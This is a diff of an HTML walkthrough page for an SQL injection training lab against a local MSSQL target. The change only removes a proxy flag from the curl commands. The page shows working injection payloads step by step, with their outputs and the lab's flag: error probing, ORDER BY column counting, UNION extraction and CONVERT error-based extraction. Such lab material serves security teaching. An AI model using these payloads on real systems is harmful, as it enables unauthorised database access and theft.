@@ -7,7 +7,7 @@
         <span class="terminal-title">Step 1. Normal Search</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=report"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=report"<br><br>
         <span class="prompt">Input: </span>report<br>
         <span class="prompt">SQL: </span>SELECT filename, filesize, uploaded_by FROM files WHERE filename LIKE '%report%'<br><br>
         <span class="prompt">Output:</span><br>
@@ -24,13 +24,13 @@
         <span class="terminal-title">Step 2. Error + Column Count</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "...?search=%27" <em># single quote</em><br>
+        <span class="prompt">$ </span>curl -s "...?search=%27" <em># single quote</em><br>
         <span class="prompt">Input: </span>'<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string ''.</strong><br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "search=' ORDER BY 3 -- -"<br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "search=' ORDER BY 3 -- -"<br>
         <span class="prompt">Input: </span>' ORDER BY 3 -- -<br>
         <span class="prompt">Result: </span>All 6 files displayed (3 columns confirmed)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "search=' ORDER BY 4 -- -"<br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "search=' ORDER BY 4 -- -"<br>
         <span class="prompt">Input: </span>' ORDER BY 4 -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: The ORDER BY position number 4 is out of range of the number of items in the select list.</strong>
     </div>
@@ -47,7 +47,7 @@
         <span class="terminal-title">Step 3. UNION Flag Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -"<br><br>
         <span class="prompt">Input: </span>' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -<br><br>
         <span class="prompt">Output (injected row):</span><br>
         <strong>FLAG{ms_0p3nr0ws3t_r34d}</strong> &bull; 0 bytes &bull; Uploaded by: LEAKED
@@ -63,7 +63,7 @@
         <span class="terminal-title">Step 4. CONVERT Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_0p3nr0ws3t_r34d}' to data type int.</strong>
     </div>
@@ -128,7 +128,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab10" \<br> --data-urlencode "search=' UNION SELECT flag, 0, 'LEAKED' FROM flags -- -"<br><br>
         <span class="prompt">Output: </span><strong>FLAG{ms_0p3nr0ws3t_r34d}</strong> &bull; 0 bytes &bull; Uploaded by: LEAKED
     </div>
 </div>
